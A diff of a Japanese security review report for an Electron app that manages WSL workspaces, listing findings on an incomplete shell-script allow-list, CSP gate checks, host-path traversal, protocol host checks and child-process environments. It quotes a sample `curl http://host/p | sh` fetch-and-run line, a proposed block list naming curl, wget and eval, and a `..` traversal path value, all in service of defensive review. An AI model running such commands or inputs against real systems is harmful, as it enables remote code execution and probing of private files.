-### [High] probe スクリプト定数の 3 不変条件を「SH-014 項目 6 が検査する」とした記述が、同じ bundle 内の research と矛盾する (H-004)
+  ```js
+  for (const line of script.split('\n')) {
+    const body = line.trim()
+    if (body === '' || body.startsWith('#')) continue
+    if (!DISTRO_SCRIPT_ALLOWED_FORMS.some((form) => body.includes(form))) { ... }
+  }
+  ```
 
-- **観察**: `runtime-detection.md`「定数には次の不変条件が付随し、**SH-014 の項目 6 がこれを検査する**」。一方 `research.md`「一致検証が見るのは『実行されるものが定数と一致するか』だけであり、**定数の内容が Principle VI に反するかは検証できない**」— 担保を ADR (人間) に置くと明記。項目 6 の定義自体も「定義済みの内容と一致すること」= 等値検査。
-- **攻撃経路**: 実装者 / レビュワーが C-3 を読み「3 不変条件は CI が見る」と理解する (契約が明示的にそう書いている) → `SCRIPT` 定数に `~/.bashrc` への追記を含む 1 行を足し実行箇所は無変更で PR を出す → 項目 6 は「実行されるものと定数の一致」を見るので**緑**。lint / depcruise / 残り 8 項目も緑。SC-009 も満たす → ADR 起票の要求は文書上の約束で機械検証が無く、レビュワーが「項目 6 が検査する」を信じれば素通りする。
-  **第 2 の穴**: 項目 6 は静的走査である一方、スクリプトは**標準入力で渡される**。定数に別の文字列を連結して書き込む形は「定数が存在する」検査を通過する。C-3 の「動的に組み立てない」を機械的に裏づける規則が bundle に無い。
-- **同種事象探索**: `項目 6|定数` で **12 件**。項目 6 の検査内容を**等値以上に定義した箇所は 0 件**。
-- **リスク/影響**: Principle VI の最後の砦が「人間の ADR レビュー」であるのに、契約が「機械検証される」と誤って宣言している。**誤った安心が唯一の防御を無力化する**。
-- **推奨アクション**: (a) 「**不変条件は ADR レビューで担保する (機械検証されない)**」に訂正する、または (b) SH-014 項目 6 を 3 検査に分解する — (i) 定数が単一のリテラルであること、(ii) 標準入力へ書く式が**定数識別子そのもの**であること (連結・テンプレートを禁止)、(iii) 定数内に許可するコマンド形の allow-list。C-7 の拡張条件にも同じ文言を適用する。
-- **根拠**: Principle VI / FR-037 (f)
+  判定は `body.includes(form)` であり、**行全体が許可形に収まっていることを要求しない**。`allowlists.mjs:239-247` の許可形は `command -v` / `test -` / `unshare` / `cat /proc/` / `echo` / `printf` / `exit`、`:250` の禁止形は `>` / `>>` / `tee` / `dd ` / `install ` / `mkdir` / `touch` のみで、**`;` / `&&` / `||` 以降の連結、`|` によるパイプ、`` ` `` / `$(...)` のコマンド置換、`rm` / `mv` / `cp` / `ln` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を禁じる行が 0 件**。例えば `printf 'bwrap=%s\n' "$x"; curl http://host/p | sh` は (i) 単一リテラル、(ii) 標準入力へ書く式が識別子そのもの、(iii) 各行が `printf` を含む、を**すべて満たす**。
+- **同種事象探索**: `DISTRO_SCRIPT_ALLOWED_FORMS|DISTRO_SCRIPT_FORBIDDEN_FORMS` → 定義 1 件 (`allowlists.mjs:239,250`)、使用 1 件 (`check.mjs:307,315`)。行全体を錨付け (`^...$`) で照合する実装 **0 件**。`;`/`|`/`` ` ``/`$(` を禁止形に含める行 **0 件**。
+- **リスク/影響**: design-gate H-004 の**誤った安心**の部分は解消済みであり (`probe-script.ts:4` と `check.mjs:325` が「機械検証されない。定数の変更には ADR を要する」と明記)、最終的な担保は人間の ADR レビューである。したがってこれは「唯一の防御が無効」ではなく、**3 点検査のうち (iii) が意図した強度に達していない**という残余である。現在の `PROBE_SCRIPT` (`probe-script.ts:38-47`) は許可形に正しく収まっており、違反は無い。
+- **推奨アクション**: (iii) を「行全体が許可形の錨付きパターンに一致すること」に変える (例: `printf '<literal>' "$(command -v X || printf '')"` のような形を正規表現で列挙する)。あるいは最小の追加として `DISTRO_SCRIPT_FORBIDDEN_FORMS` に `;` / `&&` / `|` (`||` を除く必要があるため `| ` の形) / `` ` `` / `rm ` / `chmod` / `curl` / `wget` / `sh -c` / `eval` を加える。`probe-script.ts:20-25` が「リダイレクトを 1 つも使わない」理由として述べている論法 (「1 つでも許すと検証の意味が薄れる」) は連結・パイプにもそのまま当てはまる。
+- **根拠**: Constitution Principle VI、FR-037 (f)、CWE-78 (検査の不完全性として)、design-gate H-004 の残余
+- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files
 
-### [High] `distroName` に文字種の制約が無く、C-4「バックスラッシュを含む任意の引数を渡さない」を設計として保証できない (H-005)
+### [Medium] CSP の dev ゲート検査が `process.env` のドット記法しか見ず、bracket 記法を見逃す (M-003) (scope: feature)
 
-- **観察**: `runtime-detection.md` C-4「**バックスラッシュを含む任意の引数**を `wsl.exe` に渡さない。…パスに限った制約ではない」。data-model「`distroName` は**空白を含みうる**」「**検出時の表記をそのまま保持し、比較は完全一致で行う (正規化しない)**」。`ipc-capability.md`「識別子やディストロ名を検証せずにプロセス起動の引数に渡すとコマンド引数インジェクションの経路になる。引数配列で渡し、**検出済みの名前に一致することを必ず確認する**」。
-- **攻撃経路**: 利用者が (あるいは配布された tarball と `wsl --import` の手順により) バックスラッシュを含む名前や先頭が `-` の名前でディストロを登録する → `list()` がその名前を**そのまま** `distroName` に載せる (正規化禁止)。ここで「検出済みの名前に一致すること」という唯一の防御は、**検出自身が出力元である以上恒真**であり文字種の制約を何も課さない → 名前空間識別子と UNC 接頭辞が生成され、後者は C-001 と同じ機序で正規化される → `probe(distro)` の引数にバックスラッシュを含む値が渡り C-4 の規則に**抵触する**。この場合に何をするかは設計に定義が無く実装者の裁量に落ちる → `wsl.exe` の引数処理がバックスラッシュを消す (AD-015 §5) ため、消えた後の文字列が**別の実在ディストロ名に一致する**可能性もある。
-- **同種事象探索**: `distroName|ディストロ名` で **16 件**。文字種を制約する行 **0 件**、不正名を拒否する経路 **0 件**。spec が想定する範囲は「空白・数字を含む」までで、「改名・削除・重複」も文字種には触れない。
-- **リスク/影響**: 未信頼文字列が (a) プロセス引数、(b) UNC パス成分、(c) 名前空間識別子の 3 箇所へ同時に流れ込み、契約が掲げた不変条件を維持できない。
-- **推奨アクション**: data-model に「`distroName` はバックスラッシュ・`/`・`:`・NUL・制御文字を含まず、先頭が `-` でないこと。満たさない名前は descriptor を生成せず、**列挙不能として理由つきで一覧に出す**」を追加。`ipc-capability.md` の一文を「検出済みの名前に一致すること**に加え、文字種の制約を満たすこと**」に改める。BE-022 / BE-001 に反映し BE-020 のフィクスチャに不正名ケースを追加。
-- **根拠**: CWE-88 / CWE-22 / AD-015 §5 / C-4
+- **観察**: `scripts/constitution/check.mjs:449`
 
-### [Medium] `path` 以外のフィールド値に検証規則が無く、allow-list は「キー名」の許可であって値の検証ではない (M-001)
+  ```js
+  const envGate = /process\s*\.\s*env\s*\.\s*[A-Za-z0-9_]+/.exec(src.code)
+  ```
 
-- **観察**: `workspace-store.md`「保存するフィールドはコード上の allow-list で固定し、**未知のキー**は読み書きのどちらでも通さない」。読み戻し規則 5 行は `schemaVersion` / parse / namespace / `path` のみ。`WorkspaceFolderDraftDTO = { location, path, displayName }` に対し検証表に **`displayName` の行が無い**。
-- **攻撃経路**: 別プロセス / 攻撃者が user data 配下の JSON に 10MB の `displayName`、制御文字入りの `displayName`、同一 `id` を持つ重複レコードを書く → すべてキー allow-list を通り `path` は正当なので**復元される** → `id` の重複により `unregisterFolder(id)` / `resolveFolderRuntime(folderId, ...)` の対象が一意に決まらない (検証は「既知の登録エントリに一致すること」だけで一意性を要求しない) → 巨大な `displayName` が一覧描画を止め SC-004 の「再表示 100ms」を破る。
-- **同種事象探索**: `displayName` で **4 件**。**検証規則を与えた行は 0 件**。`id` / `registeredAt` も同様に 0 件。
-- **推奨アクション**: 読み戻し規則に「`id` は形式と**一意性**、`displayName` は長さ上限と制御文字の禁止、`registeredAt` は有限の数値」を追加し、違反は新理由キー `invalid-record` で計上する。検証表に `displayName` 行を追加。BE-041 / BE-044 のテスト観点に足す。
-- **根拠**: CWE-20 / FR-019
+  FR-040 は「緩和は CSP を組み立てる 1 関数の dev 分岐にのみ現れ、**ゲートは `app.isPackaged` とする** — 環境変数で判定すると出荷物でも環境変数 1 つで有効化できる」と要求し、項目 10 (d) がこれを検査する。しかし正規表現はドット記法限定で、**このリポジトリ自身が bracket 記法を使っている** — `src/main/app/origins.ts:34` / `:58` は `process.env['ELECTRON_RENDERER_URL']` である。同じ書き方を `protocol.ts` の dev 分岐に持ち込めば、検査は発火しない。
+- **同種事象探索**: `process\s*\.\s*env|process\[` を `src/` で grep → **3 件** (`origins.ts:34`、`origins.ts:58`、`wsl-cli.ts:87`)。うち **2 件が bracket 記法**で、現行の検査パターンでは捕捉できない形である。等価経路 (bracket / 分割代入 / `Object.entries(process.env)` 等) を見る行 **0 件**。なお `allowlists.mjs:265-280` の Principle II 用パターンは bracket 記法と分割代入を**きちんと列挙している**ため、同一リポジトリ内で強度が揃っていない。
+- **リスク/影響**: 現時点で `protocol.ts` は `process.env` を一切参照せず、実効ゲートは `origins.ts:27-29` の `!app.isPackaged` と env 変数の AND になっているため**違反は無い**。問題は検査の網であり、FR-036 が Principle II の検査に「識別子の直接参照だけでなく、等価な API と構文変形も対象とし」と課したのと同じ要求が FR-040 側の検査に反映されていない点。R-2 以降で dev 分岐を触る feature が bracket 記法を使えば静かに抜ける。
+- **推奨アクション**: `allowlists.mjs` に `ENV_ACCESS_PATTERNS` を新設し、ドット記法・bracket 記法 (`process\s*\[\s*['"\`]env['"\`]\s*\]` も含む)・分割代入 (`{...env...} = process`) を列挙して項目 10 (d) と将来の項目から共用する。`PLATFORM_BRANCH_PATTERNS` と同じ書式に揃えれば、強度の差が構造的に生じない。
+- **根拠**: FR-040 / FR-036 / SC-016、AD-025 §7、CWE-693 (Protection Mechanism Failure)
+- **scope 根拠**: `scripts/constitution/{check,allowlists}.mjs` は本 PR の touched files
 
-### [Medium] probe スクリプトの不変条件「読み取りのみ」が、data-model が要求する判定 4 と文面上矛盾する (M-002)
+### [Medium] ホスト名前空間のパスに `.` / `..` の拒否も正規化も無く、`registerFolder` + `listFolders` が任意ホストパスの存在オラクルになる (M-004) (scope: feature)
 
-- **観察**: `runtime-detection.md` 不変条件 1「**読み取りのみで**、ディストロ内に永続的な変更を残さない」。一方 data-model の実地判定 4「**実際に user namespace を作成できる**」。作成は読み取りではない。
-- **リスク/影響**: H-004 のとおり、この不変条件の実効的な担保は ADR + 人間レビューしかない。その文言が最初から自己矛盾していると、レビュー時に「読み取りのみ」が緩く読まれ、C-7 で I-1 が項目を追加するときの判定基準が失われる。
-- **同種事象探索**: `読み取りのみ` で **1 件** (判定 4 と矛盾)。他の不変条件 2 / 3 は判定 1〜4 と矛盾しない。
-- **推奨アクション**: 不変条件 1 を「ディストロ内に**永続的な**変更 (ファイル・パッケージ・OS 設定) を残さない。プロセス寿命で消える一時資源の生成 (user namespace の試験生成) は許す」と書き直し、research と C-7 の 3 条件にも同じ語を使う。
-- **根拠**: Principle VI / FR-037 (f)
+- **観察**: `src/domain/runtime/path-types.ts:80-94` `makeHostPath` は長さ・制御文字・ドライブレター形式・末尾セパレータのみを扱い、**`.` / `..` セグメントを拒否も解決もしない** (同ファイル `:117` の `makeRuntimePath` は明示的に拒否している)。IPC 境界の `src/main/app/validate.ts:69` も `if (p.namespace === 'host') return true` で、ホスト値には長さと制御文字以外の制約が無い。したがって `registerFolder({ location:{kind:'windows'}, path:{namespace:'host', value:'C:\\Users\\x\\..\\..\\Windows\\System32\\config'}, displayName:'a' })` が受理され、`folder-service.ts:138` の `hostFs.exists(folder.path)` が `stat` を発行して結果が `reachability` として renderer に返る。
+  spec `## Assumptions` は「所在 `windows` の登録パスは renderer の主張をそのまま受理する。**到達可能性の実在確認を登録済みエントリに限ることで、任意パスの存在を問い合わせる経路を作らない**」と書くが、登録自体に回数制限も由来の要求も無いため、**register → list を繰り返せば任意ホストパスの存在を列挙できる**。前段の主張が実装で成立していない。
+  併せて `src/domain/workspace/folder.ts:100` `folderKey` が未正規化の `path.value` を鍵にするため、`C:\a\..\b` と `C:\b` は別エントリになる — FR-016 の「末尾セパレータの有無は正規化後に同一とみなす」と同じ論法が `..` には効いていない。
+- **同種事象探索**: `makeHostPath` の呼び出し → **4 件** (`folder-service.ts:205` renderer draft / `folder-record.ts:120` 永続化復元 / `composition-root.ts:58` userData / `path-api.ts:116,180` 変換と join の内部)。このうち**未信頼入力を受けるのは 2 件** (`folder-service.ts:205` / `folder-record.ts:120`) で、いずれも `..` を拒否しない。ホスト値に対して `.`/`..` を拒否または正規化する行 **0 件** (`hostPathOps.join` (`path-api.ts:177`) は `isValidHostSegment` 経由で拒否するが、`makeHostPath` の生成経路は通らない)。**ランタイム名前空間側は 0 件の漏れ** (`path-types.ts:117`、`validate.ts:72`、`path-api.ts:48-57`、`path-api.ts:150-154` の 4 重)。
+- **リスク/影響**: 露出はファイル存在の有無に限られ、renderer は絶対パスをそのまま登録することで同じ情報を得られる (= `..` が増やす情報は無い)。よってデータ漏洩としては小さく Medium。ただし (a) spec の Assumption が主張する不変条件が実装で成立していない、(b) `C:\a\..\b` 形の重複エントリが FR-016 を破る、(c) 3 名前空間のうちホストだけが `.`/`..` の不変条件を持たない非対称は C-001 が塞いだ構図の裏返しである、の 3 点で残すべき。
+- **推奨アクション**: `makeHostPath` に「`.` / `..` セグメントを含まないこと (解決済みであること)」を `makeRuntimePath` と同じ形で追加する。`pickHostFolder` (`composition-root.ts:109`) と `app.getPath('userData')` (`:58`) はいずれも正規化済みの値なので影響しない。あわせて data-model §1 の `HostPath` 不変条件に同じ 1 行を書き、SC-001 のテストに「`..` を含むホスト値で生成不能」を足す。Assumption の文面も「登録は renderer の主張を受理するが、値は解決済みであることを要求する」に改める。
+- **根拠**: CWE-22 / CWE-20 / CWE-204 (存在オラクル)、FR-016 / FR-021 / FR-027、spec `## Assumptions`、data-model §1
+- **scope 根拠**: `path-types.ts` / `validate.ts` / `folder.ts` は本 PR の touched files
 
-### [Low] `registerFolder` の `location` に検出済み descriptor との照合行が無い (L-001)
+### [Low] プロトコルハンドラが要求 URL の host 成分を検査せず、同じアセットが任意の `closta://<host>/` で配信される (L-001) (scope: feature)
 
-- **観察**: 検証表は `beginBrowse` の `location` にだけ「検出済み descriptor に完全一致」を課す。`registerFolder(draft)` に対する行は `path` と `path` と `location` の 2 つだけで、所在ディストロの実在性は問われない。
-- **影響**: 存在しないディストロ名を所在として登録でき、以後 `distro-absent` の到達不可エントリとして残る。重複判定キーが `(所在, 正規化済みパス)` なので、存在しない所在で任意個のエントリを作れる。登録解除で救えるため実害は小さい。
-- **同種事象探索**: `registerFolder` で **3 件**。`location` の実在性照合は **0 件**。
-- **推奨アクション**: 検証表に「`registerFolder` の `location` は `kind === 'wsl'` のとき検出済み descriptor に一致すること」を追加するか、意図的に許すなら「登録時点で存在しない所在を許す (改名・未起動を跨ぐため)」を `## Assumptions` に明記する。
-- **根拠**: CWE-20 / FR-016
+- **観察**: `src/main/app/protocol.ts:112-118` は `new URL(requestUrl).pathname` だけを使い、host 成分を捨てる。`registerAppProtocol` (`:161`) はスキーム全体に対してハンドラを張るため、`closta://evil/index.html` も 200 で配信される。
+- **同種事象探索**: `request.url` / `new URL(requestUrl)` の使用 **1 件** (`protocol.ts:114`)。host を照合する行 **0 件**。`PACKAGED_ORIGIN` (`origins.ts:19`) との突き合わせ **0 件**。
+- **リスク/影響**: 現状は無害である — `closta://evil` は `allowedOrigins()` (`origins.ts:49-54`) に含まれないので `isTrustedSender` が IPC を拒否し (`validate.ts:50`)、`frame-ancestors 'none'` と `default-src 'none'` が frame 化も封じ、`will-navigate` も遷移を止める。ただし「配信元 origin は 1 つ」という FR-039 の前提に対し、実際には同一コードを載せた別 origin が無数に作れる状態であり、origin を鍵にした防御 (送信元検証・`localStorage` 分離) の前提が緩い。
+- **推奨アクション**: `resolveRequest` の冒頭で `new URL(requestUrl).host` が `PACKAGED_ORIGIN` の host と一致することを検査し、不一致は `null` (= 403) を返す。`protocol.test.ts` にケースを 1 つ足す。
+- **根拠**: FR-039 (「許可する origin の集合は 1 つの定数に集約」)、CWE-346 (Origin Validation Error)
+- **scope 根拠**: `protocol.ts` は本 PR の touched files
+
+### [Low] `wsl.exe` 子プロセスに親環境を丸ごと渡している (L-002) (scope: feature)
+
+- **観察**: `src/main/infra/runtime/wsl-cli.ts:87` — `env: { ...process.env, WSL_UTF8: '1' }`。
+- **同種事象探索**: `spawn` の呼び出し **1 件** (`wsl-cli.ts:84`)。`env` を最小集合で組む実装 **0 件**。
+- **リスク/影響**: WSL は既定では Windows 側環境変数をディストロ内へ共有しないが、利用者の `WSLENV` 設定次第で共有対象が広がる。Principle V / FR-019 が「秘密情報のフィールドを持たない」と定めた対象は永続化スキーマであり環境変数は射程外だが、将来 `provider` (X-3) が API キーをプロセス環境に載せる設計を採ると、この 1 行が自動的に共有経路になる。R-1 時点で秘密は存在しないため Low。
+- **推奨アクション**: `env` を `{ WSL_UTF8: '1', SystemRoot: process.env.SystemRoot, ... }` のように**必要な変数の明示列挙**に変える (Windows では `SystemRoot` / `PATH` / `USERPROFILE` 程度で足りる)。渡す変数の集合を設計で決められる形にしておく。
+- **根拠**: Constitution Principle V、CWE-214 (Invocation of Process Using Visible Sensitive Information)
+- **scope 根拠**: `wsl-cli.ts` は本 PR の touched files
+
+### [Low] `build/entitlements.mac.plist` が dyld 環境変数と未署名実行メモリを許可している (L-003) (scope: out-of-scope)
+
+- **観察**: `build/entitlements.mac.plist:5-10` が `com.apple.security.cs.allow-jit` / `allow-unsigned-executable-memory` / `allow-dyld-environment-variables` を `true` にしている。`electron-builder.yml:31-38` が `entitlementsInherit` で参照する。
+- **同種事象探索**: entitlements ファイル **1 件**。`hardenedRuntime` / `notarize: false` (`electron-builder.yml:38`)。
+- **リスク/影響**: `allow-dyld-environment-variables` は `DYLD_INSERT_LIBRARIES` によるライブラリ注入を許す。ただし macOS ホストは `DirectRuntime` (OPT-mac) として **spec の Out of Scope** に明示されており、R-1 は Windows インストーラのみを 1 回通す (FR-043 / SC-010)。scaffold 既定値であり本 feature が意図して置いた値ではない。
+- **推奨アクション**: mac ビルドを実際に出す feature (OPT-mac / D-1) で `allow-unsigned-executable-memory` と `allow-dyld-environment-variables` の必要性を再評価する。R-1 では変更しない判断でよいが、`docs/decisions/0026-packaging-first-pass.md` に「mac entitlements は未評価」と 1 行残すと次の feature が拾える。
+- **根拠**: CWE-426 (Untrusted Search Path)、Apple Hardened Runtime
+- **scope 根拠**: macOS ホストは spec の Out of Scope。D-1 (署名つきインストーラ配布) で扱う領域
+
+### [Low] プロトコル応答に `X-Content-Type-Options: nosniff` が無い (L-004) (scope: feature)
+
+- **観察**: `src/main/app/protocol.ts:169-175` の応答ヘッダは `Content-Type` と `Content-Security-Policy` の 2 つのみ。`mimeTypeOf` (`:88-92`) は未知拡張子を `application/octet-stream` に落とす。
+- **同種事象探索**: `new Response(` **4 件** (`protocol.ts:162` 500 / `:165` 403 / `:169` 200 / `:176` 404)。`nosniff` **0 件**。
+- **リスク/影響**: 配信対象が同梱ディレクトリ配下に封じ込められており (`:112-144`)、CSP が `default-src 'none'` + 自己オリジン限定なので MIME sniffing による実害経路は現状無い。1 ヘッダのコストで閉じられる残余。
+- **推奨アクション**: 200 応答に `'X-Content-Type-Options': 'nosniff'` を追加する。`protocol.test.ts` のヘッダ検証に 1 行足す。
+- **根拠**: CWE-430 / OWASP Secure Headers
+- **scope 根拠**: `protocol.ts` は本 PR の touched files
 
 ## 同種事象探索 cascade summary
 
-| 指摘 ID | Grep query | 該当件数 |
-|---|---|---|
-| C-001 | `セパレータ\ | バックスラッシュ` | 17 / **未信頼値中のバックスラッシュを制約した行 0** |
-| C-001 (入口) | 未信頼値 → UNC 到達の入口列挙 | **3** (`target.of` / `name`、`registerFolder.path`、`invalid-path`) |
-| C-002 | `送信元\ | senderFrame\ | sender\ | webContents\ | ipcMain` | 2 (要求の参照のみ) / **検証定義 0** |
-| H-001 | `beginBrowse\ | browseDirectory` | contracts 10 / 他ファイル **0** |
-| H-002 / H-003 | `CSP\ | Content-Security\ | script-src\ | unsafe\ | カスタムプロトコル\ | protocol` | 10 / **directive 指定 0・ハンドラ範囲制約 0** |
-| H-004 | `項目 6\ | 定数` | 12 / **等値以上の検査定義 0** |
-| H-005 | `distroName\ | ディストロ名` | 16 / **文字種制約 0** |
-| M-001 | `displayName` | 4 / **検証規則 0** |
-| M-002 | `読み取りのみ` | 1 (判定 4 と矛盾) |
-| L-001 | `registerFolder` | 3 / **location 実在性照合 0** |
+| 指摘 ID | Grep query | 該当件数 | path:line |
+|---|---|---|---|
+| H-001 | `openExternal\|setPermissionRequestHandler\|setPermissionCheckHandler` (repo 全体) | `src/` 内 **2** / scheme 許可リスト **0** / 挙動テスト **0** | `src/main/app/window.ts:48`, `:64` (両方 scheme 無検査)。許可リスト定義 0 件 (`scripts/constitution/allowlists.mjs` に `openExternal` 項目なし)。`*.test.ts*` 全走査で `openExternal`/`will-navigate`/`setWindowOpenHandler` の検証 0 件。存在確認のみの検査: `scripts/constitution/check.mjs:502-510` |
+| H-002 | `inflight\|inFlight\|single-flight\|singleFlight\|coalesc\|dedupe` (repo 全体) | `src/` 内 **0** | spawn 到達点 1 件 (`src/main/infra/runtime/wsl-cli.ts:84`)、到達する IPC 4 件 (`ipc.ts:89` refresh / `ipc.ts:91` probeRuntime / `folder-service.ts:241` beginBrowse / `folder-service.ts:120` listFolders)。回数制限 0 件。`sessions` 上限・掃除 0 件 (`folder-service.ts:98,246`) |
+| M-001 | `setPermissionRequestHandler\|setPermissionCheckHandler` | **0** | 該当 0 件。session 参照は `src/main/app/window.ts:72` のみ |
+| M-002 | `DISTRO_SCRIPT_ALLOWED_FORMS\|DISTRO_SCRIPT_FORBIDDEN_FORMS` | 定義 **1** / 使用 **1** / 行全体錨付け **0** | `scripts/constitution/allowlists.mjs:239,250`、`scripts/constitution/check.mjs:307,315`。`;`/`\|`/`` ` ``/`$(` を禁止形に含める行 0 件 |
+| M-003 | `process\s*\.\s*env\|process\[` (`src/`) | **3** / うち bracket 記法 **2** / 等価経路を見る検査 **0** | `src/main/app/origins.ts:34`, `:58` (bracket)、`src/main/infra/runtime/wsl-cli.ts:87`。検査パターン: `scripts/constitution/check.mjs:449` (ドット記法のみ)。対照: `allowlists.mjs:265-280` は bracket/分割代入を列挙済み |
+| M-004 | `makeHostPath` / ホスト値の `..` 拒否 | 呼び出し **4** / 未信頼入力 **2** / `..` 拒否 **0** | `src/main/app/folder-service.ts:205`、`src/main/infra/settings/folder-record.ts:120` (いずれも未信頼)、`src/main/app/composition-root.ts:58`、`src/domain/runtime/path-api.ts:116,180`。定義 `src/domain/runtime/path-types.ts:80-94` に `.`/`..` の行なし。対照: ランタイム側は 4 重 (`path-types.ts:117` / `validate.ts:72` / `path-api.ts:48-57` / `path-api.ts:150-154`) |
+| L-001 | `new URL(requestUrl)` / host 照合 | **1** / host 照合 **0** | `src/main/app/protocol.ts:114` |
+| L-002 | `spawn(` + `env:` | spawn **1** / 最小 env **0** | `src/main/infra/runtime/wsl-cli.ts:84,87` |
+| L-003 | entitlements | **1** | `build/entitlements.mac.plist:5-10` |
+| L-004 | `new Response(` / `nosniff` | Response **4** / nosniff **0** | `src/main/app/protocol.ts:162,165,169,176` |
 
-## Verdict
-
-- Critical: 2 / High: 5 / Medium: 2 / Low: 1
-- Round inheritance: security 観点は本 round が第 1 回のため resolved: **0** / unresolved: **0** / new: **10**
+**Critical は 0 件のため cascade enforcement による降格対象は無い。** H-001 / H-002 はいずれも「renderer 内のスクリプト実行という別の破れを 1 つ要する」ため、`reviewer-base.md` §禁則 (仮定的な将来攻撃経路 / defense-in-depth は High 上限) に従い自ら High に置いた。
 
 ## 意図的に報告しなかったもの
 
-(1) ブラウズトークンのランダム性・長さ・エントロピー (実装技法)、(2) 退避ファイルの命名・世代管理・パーミッション (store に秘密が無いことを確認済み)、(3) 脅威モデル文書・DFD の作成要求 (本 workflow が produce しない成果物)、(4) 依存パッケージの CVE / supply chain (SH-001 未実行で lockfile が存在せず観察事実が無い。code-gate の対象)、(5) `wsl.exe` 出力パースの ReDoS (正規表現の使用が設計に明示されておらず推測になる)、(6) 「送信元検証」以外の Electron hardening 一般論 (bundle に記述が無く根拠を欠く汎用助言)、(7) 越境時の性能・UX・レイヤ配置・命名 (他 viewpoint の Owner 範囲)。
+(1) design-gate で解消済みと判定した 10 件の再指摘 — 上表で判定のみ示し finding にしない。(2) code-gate iteration 1 の MF-003 (`ipc.ts:122-127` の送信元束縛) / MF-004 (`index.html` の静的 CSP 撤去 → `protocol.ts:173` / `window.ts:76`) — 契約どおり解消済みとして扱った。(3) ブラウズトークンのエントロピー — `randomUUID()` (`folder-service.ts:245`) で `node:crypto` の CSPRNG に乗っており問題なし。(4) 依存の CVE / supply chain — `pnpm-lock.yaml` は存在するが本 subagent に `npm audit` 相当の実行手段が無く、lockfile の目視で CVE を断定すると推測になる。`inflight@1.0.6` が deprecated (メモリリーク) として lockfile に記録されているが推移的依存であり本 PR の選択ではない。(5) `unescapeOctal` (`wsl-output.ts:163-167`) 経由の NUL / バックスラッシュ注入 — ディストロ内 root を要する前提であり、かつ `makePathMapping` (`path-mapping.ts:33-56`) と `makeRuntimePath` が下流で拒否するため実害経路が成立しない。(6) 正規表現の ReDoS — `wsl-output.ts:203` の `/(?:^|[,;])path=([^,;]*)/` と `:29` / `:144` はいずれも線形で catastrophic backtracking を持たない。(7) `assertNoBackslash` (`wsl-cli.ts:57-63`) の同期 throw が `probeAll` の `Promise.all` (`runtime-store.ts:154-169`) を丸ごと reject させる形 — `distroName` が列挙時点で検証済み (`wsl-detector.ts:105`) であり到達経路が観察されないため報告しない。(8) 命名 / レイヤ配置 / a11y / UX / DTO 設計 — 他 viewpoint の Owner 範囲。
+
+## Verdict
+
+- Critical: **0**
+- High: **2** (H-001 `shell.openExternal` の scheme 無検査 / H-002 single-flight 不在による資源枯渇)
+- Medium: **4** (M-001 permission ハンドラ未設定 / M-002 項目 6 (iii) の部分一致 / M-003 env ゲート検査の記法漏れ / M-004 ホスト値の `..`)
+- Low: **4** (L-001 protocol host 無検査 / L-002 親環境の丸渡し / L-003 mac entitlements / L-004 nosniff)
+- Round inheritance: **resolved from design-gate: 10 / unresolved: 0 / new: 10**
+- design-gate で Critical だった 2 件 (C-001 / C-002) はいずれも実装で解消済み。本 round の Critical 昇格は無く、**前 Round より Severity を上げた指摘は 0 件**である (格上げに要する「追加事実」の記載は不要)。
+
+**pr-gate としての判定材料**: Critical 0 件のため security track は `done` を阻害しない。ただし H-001 は FR-040 の「拒否しなければならない」に対する実装の乖離であり、かつ SC-016 の計測経路 (検証スクリプト項目 11) が存在確認しか行わないため**機械検証では永久に検出されない**。R-3 が外部由来テキストをリンクとして描画する土台がこの実装になることを踏まえ、**H-001 は本 PR 内での修正を強く推奨する** (2 箇所に scheme 許可リストを 1 つ足すだけで閉じる)。H-002 は FR-010 が「境界で強制する制約であり UI の作り方に委ねてはならない」と名指した仕組みが実装に存在しないという観察であり、`po-reviewer` / `architecture-reviewer` の FR-010 判定と突き合わせるべき。
